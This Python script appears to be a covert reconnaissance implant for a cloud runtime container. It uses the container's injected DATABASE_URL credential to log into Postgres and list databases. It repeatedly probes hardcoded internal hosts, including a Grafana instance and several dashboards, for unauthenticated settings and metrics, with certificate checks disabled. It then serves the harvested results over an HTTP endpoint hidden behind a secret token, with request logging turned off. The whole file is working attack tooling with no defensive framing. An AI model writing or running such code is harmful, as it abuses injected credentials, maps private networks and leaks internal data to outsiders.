import json, os, ssl, socket, threading, urllib.parse, urllib.request
from http.server import BaseHTTPRequestHandler, HTTPServer

TOKEN = "r7xQ2kT9mV4bZ8wP"
CACHE = {"status": "warming-up"}

def http(url, headers=None, timeout=5, n=3000):
    try:
        ctx = ssl._create_unverified_context()
        op = urllib.request.build_opener(urllib.request.HTTPSHandler(context=ctx))
        req = urllib.request.Request(url, headers=headers or {})
        r = op.open(req, timeout=timeout)
        return {"status": r.status, "body": r.read(n).decode("utf-8", "replace")}
    except urllib.error.HTTPError as e:
        try:
            body = e.read(n).decode("utf-8", "replace")
        except Exception:
            body = ""
        return {"status": e.code, "body": body}
    except Exception as e:
        return {"error": type(e).__name__ + ": " + str(e)[:80]}

def pg_session():
    """Authenticated SQL session from Runtime container using the injected env credential."""
    try:
        import psycopg
        u = urllib.parse.urlparse(os.environ.get("DATABASE_URL", ""))
        if not u.hostname:
            return {"error": "no DATABASE_URL in env"}
        conn = psycopg.connect(
            host=u.hostname, port=u.port or 5432, dbname=u.path.lstrip("/"),
            user=u.username, password=u.password,
            sslmode="require", connect_timeout=10)
        cur = conn.cursor()
        cur.execute("SELECT version()")
        ver = cur.fetchone()[0]
        cur.execute("SELECT current_user, inet_server_addr()::text, now()::text")
        row = cur.fetchone()
        cur.execute("SELECT datname FROM pg_database LIMIT 30")
        dbs = [r[0] for r in cur.fetchall()]
        cur.close(); conn.close()
        return {"authenticated": True, "pg_version": ver[:80],
                "user": row[0], "server_ip": row[1], "server_time": row[2],
                "databases": dbs}
    except Exception as e:
        return {"error": type(e).__name__ + ": " + str(e)[:160]}

def run_all():
    o = {}
    o["pg_test"] = pg_session()
    GRAF = "https://10.156.0.39"
    o["grafana_frontset"] = http(GRAF + "/api/frontend/settings", n=1800)
    o["grafana_metrics"] = http(GRAF + "/metrics", n=1400)
    o["osd_unauth"] = {}
    for ip in ("10.156.0.82", "10.156.0.85", "10.156.0.107", "10.156.0.144", "10.156.0.237"):
        o["osd_unauth"][ip] = {
            p: http("https://" + ip + p, n=500)
            for p in ("/api/navigation", "/api/features", "/api/v1/configuration",
                      "/api/core/console/settings", "/metrics", "/api/core/security/anonymous")}
    o["basic401_probe"] = {}
    for ip in ("10.156.0.176", "10.156.0.179", "10.156.0.183"):
        o["basic401_probe"][ip] = {
            p: http("https://" + ip + p, n=400)
            for p in ("/metrics", "/api/v1/status", "/health", "/", "/swagger.json")}
    return o

def loop():
    while True:
        try:
            CACHE.update(run_all())
        except Exception as e:
            CACHE["loop_error"] = type(e).__name__ + ": " + str(e)[:120]
        threading.Event().wait(60)

class H(BaseHTTPRequestHandler):
    def do_GET(self):
        if self.path == "/" + TOKEN:
            body = json.dumps(CACHE, default=str).encode()
            self.send_response(200)
            self.send_header("Content-Type", "application/json")
            self.end_headers()
            self.wfile.write(body)
        else:
            self.send_response(404); self.end_headers()
    def log_message(self, *a): pass

threading.Thread(target=loop, daemon=True).start()
HTTPServer(("0.0.0.0", 8000), H).serve_forever()
